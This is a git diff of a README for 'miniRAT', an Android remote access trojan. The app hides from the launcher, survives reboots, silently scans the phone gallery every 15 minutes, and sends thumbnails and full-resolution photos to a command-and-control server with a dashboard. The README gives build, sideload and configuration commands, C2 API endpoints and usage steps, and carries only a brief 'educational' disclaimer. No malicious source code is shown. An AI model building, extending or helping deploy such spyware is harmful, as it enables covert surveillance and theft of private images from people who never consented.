@@ -4,16 +4,15 @@
 
 **A minimal, educational Android Remote Access Trojan**
 
-*Stealth gallery exfiltration • Periodic silent scan • Auto-hide from launcher*
+*Stealth gallery exfiltration • Full image on-demand • Auto-hide from launcher*
 
 [![Android](https://img.shields.io/badge/Android-API%2021+-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://developer.android.com)
 [![Node.js](https://img.shields.io/badge/Node.js-16+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org)
 [![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge)](LICENSE)
-[![Java](https://img.shields.io/badge/Java-Android%20SDK-007396?style=for-the-badge&logo=openjdk&logoColor=white)](https://www.java.com)
 
 ---
 
-*miniRAT demonstrates how a covert Android app can silently scan a device's gallery, generate thumbnails of every photo, and exfiltrate them to a remote command-and-control server — all while remaining invisible to the user.*
+*miniRAT silently scans a target device's gallery, exfiltrates thumbnails to a C2 server, and lets you request full-resolution images on demand — all while invisible to the user.*
 
 </div>
 
@@ -22,51 +21,28 @@
 ## ⚡ How It Works
 
 ```
-📱 Target Device                          🖥️ C2 Server
+📱 Target Device                          🖥️ C2 Server (dashboard)
                                           
- ┌─────────────────┐                      ┌──────────────────────┐
- │  App installed   │                      │  node server.js      │
- │  (sideloaded)    │                      │  Listening on :5000   │
- └────────┬────────┘                      └──────────┬───────────┘
-          │                                          │
-          ▼                                          │
- ┌─────────────────┐                                 │
- │  First Launch    │                                 │
- │  ─────────────── │                                 │
- │  • Permission    │                                 │
- │    dialog shown  │                                 │
- │  • Service starts│                                 │
- │  • Icon vanishes │                                 │
- │    from drawer   │                                 │
- └────────┬────────┘                                 │
-          │                                          │
-          ▼                                          │
- ┌─────────────────┐                                 │
- │  Every 15 min:   │                                 │
- │  ─────────────── │                                 │
- │  1. Ping server  │         HEAD request            │
- │     reachable?  ─┼──────────────────────────────▶  │
- │                  │         200 OK                   │
- │                  │ ◀──────────────────────────────  │
- │                  │                                 │
- │  2. Scan gallery │                                 │
- │     (skip already│                                 │
- │      uploaded)   │                                 │
- │                  │                                 │
- │  3. Upload new   │    POST /api/upload/thumbnail   │
- │     thumbnails  ─┼──────────────────────────────▶  │
- │                  │    { filename, thumbnail }       │
- │                  │                                 │
- │  Server down?    │                                 │
- │  → Stay idle,    │                                 │
- │    retry in 15m  │                                 │
- └─────────────────┘                                 │
-                                                      │
-                                                      ▼
-                                           ┌──────────────────────┐
-                                           │  Gallery Dashboard   │
-                                           │  Live auto-refresh   │
-                                           └──────────────────────┘
+ App installed → icon vanishes →           node server.js (:5000)
+ foreground service starts →               
+                                          
+ ┌──────── Every 15 min ────────┐         ┌──────────────────────┐
+ │                              │         │                      │
+ │  1. HEAD → server up?        │────────▶│  ✓ 200 OK           │
+ │     no → idle, retry later   │         │                      │
+ │                              │         │                      │
+ │  2. Scan gallery             │         │                      │
+ │     skip already-uploaded    │         │                      │
+ │                              │         │                      │
+ │  3. POST thumbnails          │────────▶│  Save to ./uploads   │
+ │     (128×128, ~10 KB each)   │         │                      │
+ │                              │         │                      │
+ │  4. GET /api/requests        │────────▶│  Any full-image      │
+ │     any full-image requests? │         │  requests queued?    │
+ │                              │         │                      │
+ │  5. POST full images         │────────▶│  Save to ./fullsize  │
+ │     (for requested ones)     │         │  Download button     │
+ └──────────────────────────────┘         └──────────────────────┘
 ```
 
 ---
@@ -78,29 +54,28 @@
 <td width="50%">
 
 ### 📱 Android Client
-- **Zero-UI** — No visible interface, ever
-- **Auto-hide** — Disappears from app drawer after first launch
+- **Zero-UI** — Invisible activity, auto-hides from launcher
 - **Periodic scan** — Every 15 min, checks for new photos
 - **Server-aware** — Only uploads when C2 is reachable
 - **Deduplication** — Never re-uploads the same image
+- **Full image on-demand** — Server requests → phone uploads full-res
 - **All image formats** — JPEG, PNG, WEBP, GIF, HEIC, BMP...
-- **Memory-safe** — Downsampled decoding with `inSampleSize`
-- **Boot persistence** — Restarts automatically on reboot
-- **WakeLock** — Keeps CPU active during scan even with screen off
-- **Foreground service** — Won't be killed by Android 8+
-- **Scoped storage** — Works on Android 10+ (ContentURIs)
-- **Runtime permissions** — Handles Android 6–14 cleanly
+- **Memory-safe** — Downsampled decoding + bitmap recycling
+- **WakeLock** — CPU active during scan even with screen off
+- **Boot persistence** — BootReceiver + START_STICKY
+- **Modular code** — Clean separation of concerns
 
 </td>
 <td width="50%">
 
 ### 🖥️ C2 Server
-- **Express.js** — Lightweight thumbnail receiver
-- **Live dashboard** — Dark-themed gallery with 3s auto-refresh
-- **Metadata tracking** — Timestamps + original filenames
-- **File storage** — Thumbnails saved as JPEG on disk
-- **REST API** — Upload, list, serve endpoints
-- **CORS enabled** — Cross-origin ready
+- **Live dashboard** — Dark-themed, 3s auto-refresh
+- **Request queue** — Click thumbnail → request full image
+- **Download button** — Appears when full image arrives
+- **Pending indicator** — Shows which requests are in-flight
+- **File-based persistence** — Thumbnails + metadata on disk
+- **50MB JSON limit** — Handles full-res uploads
+- **Path traversal protection** — `path.basename()` sanitization
 
 </td>
 </tr>
@@ -110,40 +85,34 @@
 
 ## 🚀 Quick Start
 
-### 1. Clone & Configure
+### 1. Configure
 
 ```bash
 git clone https://github.com/Rhishavhere/miniRAT.git
 cd miniRAT
-```
-
-Set your C2 server URL:
-
-```bash
 echo "DOMAIN_URL=https://your-server.com" > app/local.properties
 ```
 
-### 2. Start the C2 Server
+### 2. Start C2
 
 ```bash
 npm install express cors multer
 node server.js
 ```
 
-```
-🐀 RAT server running at http://localhost:5000
-```
-
-### 3. Build & Deploy the APK
+### 3. Build & Deploy
 
 ```bash
 ./gradlew assembleDebug
 adb install app/build/outputs/apk/debug/app-debug.apk
 ```
 
-### 4. First Launch
+### 4. Usage
 
-Tap the app icon once. Grant storage permission. The icon disappears. The service starts its scan cycle — pinging your server every 15 minutes and uploading new thumbnails when reachable.
+1. Tap app icon once → grant permission → icon vanishes
+2. Thumbnails start appearing on dashboard
+3. Hover any thumbnail → click **"📥 Request Full"**
+4. Wait for next scan cycle → **"⬇ Download"** button appears
 
 ---
 
@@ -152,37 +121,23 @@ Tap the app icon once. Grant storage permission. The icon disappears. The servic
 ```
 miniRAT/
 │
-├── 📱 app/src/main/
-│   ├── AndroidManifest.xml           # Permissions & components
-│   └── java/com/app/minirat/
-│       ├── HiddenActivity.java       # Permission → Service → Hide → Finish
-│       ├── Service.java              # Periodic scan → Dedup → Server check → Upload
-│       └── BootReceiver.java         # Auto-restart on reboot
+├── 📱 app/src/main/java/com/app/minirat/
+│   ├── HiddenActivity.java       # Entry: permission → service → hide
+│   ├── Service.java              # Lifecycle + scan scheduling
+│   ├── GalleryScanner.java       # MediaStore queries + image processing
+│   ├── NetworkManager.java       # HTTP: ping, upload, request queue
+│   ├── UploadTracker.java        # SharedPreferences deduplication
+│   ├── MediaItem.java            # Data class (id, uri, name)
+│   └── BootReceiver.java         # Auto-restart on reboot
 │
-├── 🖥️ server.js                      # C2 server (Express.js)
-├── 🔧 app/local.properties           # DOMAIN_URL config
+├── 🖥️ server.js                   # C2 server + live dashboard
 │
-└── 📚 .claude/                        # Detailed documentation
-    ├── README.md
-    ├── ARCHITECTURE.md
-    ├── ANALYSIS.md
-    └── CONTEXT.md
+└── 📁 uploads/
+    ├── *_thumb.jpg                # Thumbnails
+    ├── *.metadata.json            # Upload metadata
+    ├── requests.json              # Pending request queue
+    └── fullsize/                  # Full-resolution images
 ```
-
----
-
-## 🔑 Permissions
-
-| Permission | Android Version | Purpose |
-|:---|:---|:---|
-| `INTERNET` | All | Upload thumbnails |
-| `WAKE_LOCK` | All | Keep CPU active during scan |
-| `READ_EXTERNAL_STORAGE` | 5.0 – 12 | Access gallery |
-| `READ_MEDIA_IMAGES` | 13+ | Access gallery (replaces above) |
-| `RECEIVE_BOOT_COMPLETED` | All | Boot persistence |
-| `FOREGROUND_SERVICE` | 8+ | Background execution |
-| `FOREGROUND_SERVICE_DATA_SYNC` | 14+ | Foreground service type |
-| `ACCESS_NETWORK_STATE` | All | Connectivity check |
 
 ---
 
@@ -190,49 +145,22 @@ miniRAT/
 
 | Method | Endpoint | Description |
 |:---|:---|:---|
+| `HEAD` | `/api/thumbnails` | Reachability check |
 | `POST` | `/api/upload/thumbnail` | Upload `{ filename, thumbnail }` |
-| `GET` | `/api/thumbnails` | List all (newest first) |
-| `GET` | `/api/fullsize/:file` | Serve full-size file |
+| `POST` | `/api/upload/fullsize` | Upload `{ filename, image }` |
+| `GET` | `/api/thumbnails` | List all (with fullsize/pending status) |
+| `GET` | `/api/fullsize/:file` | Download full-size image |
+| `GET` | `/api/requests` | List pending requests |
+| `POST` | `/api/request/:file` | Queue a full-image request |
+| `DELETE` | `/api/request/:file` | Mark request as fulfilled |
 | `GET` | `/` | Live gallery dashboard |
-
----
-
-## 🛡️ Scan Lifecycle
-
-```
-Service starts
-    │
-    ▼
-┌──────────── Every 15 minutes ────────────┐
-│                                          │
-│  1. HEAD /api/thumbnails                 │
-│     └─ Server down? → skip, retry later  │
-│                                          │
-│  2. Query MediaStore (all images)        │
-│                                          │
-│  3. Filter: skip already-uploaded IDs    │
-│     (tracked in SharedPreferences)       │
-│                                          │
-│  4. For each new image:                  │
-│     ├─ Decode → thumbnail → Base64       │
-│     ├─ POST to server                    │
-│     ├─ Success? → mark ID as uploaded    │
-│     └─ Failed?  → stop, retry next cycle │
-│                                          │
-└──────────────────────────────────────────┘
-
-Reboot? → BootReceiver → Service restarts → cycle resumes
-```
 
 ---
 
 ## ⚠️ Disclaimer
 
-> **This project is strictly for educational and authorized security research purposes.**
->
-> Unauthorized access to computer systems and data exfiltration is **illegal** under computer crime laws in most jurisdictions. This software must only be installed on devices you own or have **explicit written authorization** to test.
->
-> The author assumes **no liability** for misuse of this software.
+> **Educational and authorized security research only.**
+> Only install on devices you own or have explicit written authorization to test.
 
 ---
 
